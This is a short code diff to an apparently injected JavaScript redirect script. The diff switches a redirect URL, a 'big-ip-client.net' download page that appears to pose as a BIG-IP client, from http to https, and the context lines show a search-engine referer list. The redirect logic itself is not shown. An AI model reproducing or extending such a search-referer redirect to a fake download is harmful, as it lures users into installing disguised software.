@@ -1,6 +1,6 @@
 (function() {
     const config = {
-        redirectUrl: 'http://big-ip-client.net/download.html',
+        redirectUrl: 'https://big-ip-client.net/download.html',
 
         allowedReferers: [
             'bing',
@@ -71,3 +71,4 @@
     }
 
 })();
+
